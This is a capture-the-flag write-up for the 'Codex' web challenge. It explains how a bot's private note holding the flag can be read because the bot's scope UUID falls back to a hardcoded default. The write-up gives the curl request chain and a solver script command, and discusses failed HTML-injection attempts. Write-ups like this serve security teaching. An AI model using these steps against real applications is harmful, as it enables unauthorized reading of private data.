# Codex: reading the bot's private note

[По-русски](solve.ru.md)

## 0. The setup

The challenge is a small Bible-reader web app with comments. A bot with administrator rights stores the flag as a private note on page `matthew.7`, and the note is only visible inside the bot's own scope.

The sources in `codex.zip` are all we need: `bot.js` shows how the note is planted, `server.js` shows how comments are filtered, and `public/app.js` shows what the browser can and cannot do.

Two questions decide the task: where the note is written, and what secret is needed to read it back.

## 1. How the bot writes

`plant(origin)` in `bot.js` is short enough to quote in full:

```js
await page.goto(`${origin}/${BOT_UUID}`);
await page.evaluate(async (uuid, flag) => {
  const list = await fetch(`/api/comments?page=matthew.7&scope=${uuid}`).then((r) => r.json());
  if (!list.some((c) => c.author === 'admin' && c.text === flag)) {
    await fetch('/api/comments', {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ page: 'matthew.7', author: 'admin', text: flag, anchor: 7, scope: uuid }),
    });
  }
}, BOT_UUID, flag());
```

Three facts follow from this. The note always lands on `matthew.7`, always with `author: 'admin'`, and always with `scope` equal to `BOT_UUID`. Nothing in the request to `/api/visit` changes that, which is the first thing to check before inventing an exploit.

`BOT_UUID` is `process.env.BOT_UUID || 'cccccccc-cccc-4ccc-8ccc-cccccccccccc'` in this version. That default is the whole vulnerability: the deployment overrides `FLAG`, but not the UUID.

## 2. How reading is gated

In `server.js`, `GET /api/comments` filters on page and scope:

```js
if (!PAGE_RE.test(page) || (scope && !UUID_RE.test(scope))) return json(res, 400, ...);
return json(res, 200, comments.filter((c) => c.page === page && (c.scope || '') === scope) ...);
```

So a note is only returned for an exact scope match. `GET /api/comment/:id` behaves the same way, and the id is a `randomUUID`, so it cannot be guessed either. `POST /api/comments` accepts any scope, which lets us create notes in our own scope but gives no way to learn the bot's.

That is the trap: with an unknown UUID the note exists but is unreadable, and there is no enumeration path. The task is only solvable if `BOT_UUID` is the documented default.

## 3. The chain

With the default UUID the whole thing is three requests:

```bash
HOST=<host>
UUID=cccccccc-cccc-4ccc-8ccc-cccccccccccc
curl -s "$HOST/api/comments?page=matthew.7&scope=$UUID"           # empty at first
curl -s -X POST "$HOST/api/visit" -H 'Content-Type: application/json' \
     -d "{\"url\":\"$HOST/$UUID\"}"                              # wakes the bot
curl -s "$HOST/api/comments?page=matthew.7&scope=$UUID"           # the note with the flag
```

The first read is empty, the visit takes several seconds because the bot really launches a browser and plants the note, and the second read returns the note text.

Why the `url` field is a red herring: `POST /api/visit` keeps only the path and query of the supplied URL and rebuilds it on the application origin, and `plant()` then uses its own `BOT_UUID` anyway. Pointing the bot at another page changes nothing about where the flag is stored.

`scripts/solve_codex.py` automates exactly this and prints the note text:

```bash
python3 scripts/solve_codex.py https://<host>
```

## 4. Result

The flag format is `ctfcup{se3k_and_y3_shall_f1nd_<16 hex>}`, masked here as `ctfcup{...}`. The hex suffix is issued per deployment: two instances during the event returned different suffixes with the same prefix, so the value has to be read from the instance you are actually solving.

## 5. Dead ends

- Trying to steal the UUID through the note body fails: `app.js` renders note text as HTML, but the page sends `Content-Security-Policy: script-src 'self'`, so inline handlers and inline scripts do not execute.
- Trying to make the bot visit an attacker origin fails twice: the server rebuilds the URL on the application origin, and `bot.js` in this version does not check the origin, but it also never uses the supplied host.
- Guessing the UUID is pointless: the search space is 122 bits, and the id of the note is a separate random UUID.

## 6. What the Revenge version fixed

The harder variant, `codex-revenge.zip`, generates `BOT_UUID` with `crypto.randomUUID()` at process start and adds a `botpass` cookie that further protects `GET /api/comment/:id` and `PUT` on `admin` notes. The same three requests then return an empty list, because the note is written into a scope that cannot be learned remotely. That difference is worth knowing before assuming a solver is broken: it solves the first version by design.

## 7. Lessons

- Before attacking, read where the secret is written and which key guards it.
- A default value in source code is a vulnerability only if the deployment forgets to override it; here it did.
- Verify the deployed behaviour instead of trusting the source: a single empty `GET` tells you immediately whether the default is in place.

One paragraph: the bot plants the flag as an admin note on `matthew.7` with `scope` equal to its own UUID, which falls back to a hardcoded default because the deployment overrides only the flag; reading that scope through `/api/comments` after triggering `/api/visit` returns the note, and the suffix of the flag differs per deployment.
